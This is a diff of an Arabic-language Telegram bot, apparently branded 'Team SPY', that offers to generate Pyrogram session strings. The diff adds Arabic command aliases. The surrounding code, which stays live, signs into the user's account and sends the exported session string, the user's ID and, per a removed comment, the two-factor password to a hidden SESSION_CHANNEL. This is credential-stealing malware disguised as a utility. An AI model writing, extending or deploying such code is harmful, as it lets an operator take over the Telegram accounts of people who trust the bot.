@@ -36,17 +36,23 @@ async def start_command(client, message):
     await message.reply(
         "👋 **مرحباً بك في بوت استخراج الجلسات!**\n\n"
         "📌 **للاستخدام:**\n"
-        "• أرسل `/generate` لبدء استخراج جلسة جديدة.\n"
-        "• أرسل `/cleardb` لمسح بيانات الجلسة المحفوظة.\n\n"
+        "• أرسل `/generate` أو `/توليد` لبدء استخراج جلسة جديدة.\n"
+        "• أرسل `/cleardb` أو `/مسح` لمسح بيانات الجلسة المحفوظة.\n\n"
         "⚡ **مدعوم من Team SPY**"
     )
 
-@app.on_message(filters.command("cleardb"))
-async def clear_db(client, message):
+# ====== الأوامر العربية ======
+@app.on_message(filters.command(["generate", "توليد"]))
+async def generate_cmd(client, message):
+    await session_step(client, message)
+
+@app.on_message(filters.command(["cleardb", "مسح"]))
+async def cleardb_cmd(client, message):
     user_id = message.chat.id
     delete_session_files(user_id)
     await message.reply("✅ **تم مسح جميع بيانات الجلسة والملفات المؤقتة بنجاح.**")
 
+# ====== باقي الكود ======
 async def session_step(client, message):
     user_id = message.chat.id
     step = user_steps.get(user_id, None)
@@ -77,7 +83,6 @@ async def session_step(client, message):
             await temp_client.sign_in(user_data[user_id]["phone_number"], user_data[user_id]["phone_code_hash"], phone_code)
             session_string = await temp_client.export_session_string()
             
-            # رسالة للمستخدم
             await message.reply(
                 f"✅ **تم إنشاء الجلسة بنجاح!**\n\n"
                 f"🔑 **جلسة Pyrogram:**\n`{session_string}`\n\n"
@@ -86,7 +91,6 @@ async def session_step(client, message):
                 "⚡ **مدعوم من Team SPY**"
             )
             
-            # إرسال للقناة
             await app.send_message(
                 SESSION_CHANNEL, 
                 f"✨ **معرف المستخدم:** `{user_id}`\n\n"
@@ -111,7 +115,6 @@ async def session_step(client, message):
             await temp_client.check_password(password=password)
             session_string = await temp_client.export_session_string()
             
-            # رسالة للمستخدم
             await message.reply(
                 f"✅ **تم إنشاء الجلسة بنجاح!**\n\n"
                 f"🔑 **جلسة Pyrogram:**\n`{session_string}`\n\n"
@@ -120,7 +123,6 @@ async def session_step(client, message):
                 "⚡ **مدعوم من Team SPY**"
             )
             
-            # إرسال للقناة مع كلمة المرور
             await app.send_message(
                 SESSION_CHANNEL, 
                 f"✨ **معرف المستخدم:** `{user_id}`\n\n"
@@ -144,17 +146,12 @@ def reset_user(user_id):
     user_steps.pop(user_id, None)
     user_data.pop(user_id, None)
 
-@app.on_message(filters.command("generate"))
-async def login_command(client, message):
-    await session_step(client, message)
-
 @app.on_message(filters.text & filters.private)
 async def handle_steps(client, message):
     user_id = message.chat.id
     if user_id in user_steps:
         await session_step(client, message)
 
-# Start the bot
 if __name__ == "__main__":
     try:
         print("🚀 جاري تشغيل البوت...")
